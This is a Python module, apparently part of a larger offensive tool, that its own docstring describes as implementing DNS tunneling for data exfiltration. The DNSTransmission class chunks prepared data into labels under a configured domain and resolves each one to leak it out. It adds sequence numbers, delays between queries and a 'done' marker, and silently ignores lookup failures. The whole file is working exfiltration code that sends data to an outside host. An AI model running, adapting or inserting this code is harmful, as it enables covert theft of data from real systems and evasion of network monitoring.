"""
DNS Transmission Module
Implements DNS tunneling for data exfiltration
"""

import socket
import time
import base64
import logging
from .base import BaseTransmission
from config import Config

class DNSTransmission(BaseTransmission):
    def __init__(self):
        super().__init__()
        self.domain = Config.DNS_CONFIG['domain']
        self.chunk_size = 30  # Max label length in DNS
        self.delay_between = 0.1
        
        self.method_name = "DNS"
    
    def send(self, data):
        """Send data via DNS queries"""
        try:
            prepared = self.prepare_data(data)
            
            # Split into chunks
            chunks = [prepared[i:i+self.chunk_size] 
                     for i in range(0, len(prepared), self.chunk_size)]
            
            # Send each chunk as DNS query
            for i, chunk in enumerate(chunks):
                # Create DNS query with sequence number
                query = f"{i:04d}_{chunk}.{self.domain}"
                
                try:
                    # Send DNS query (this will fail but that's fine)
                    socket.gethostbyname(query)
                except:
                    pass  # Expected behavior
                
                time.sleep(self.delay_between)
            
            # Send completion marker
            try:
                socket.gethostbyname(f"done.{len(chunks)}.{self.domain}")
            except:
                pass
            
            self.log_attempt(True, len(data))
            return True
            
        except Exception as e:
            self.log_attempt(False, 0)
            logging.error(f"DNS send failed: {e}")
            return False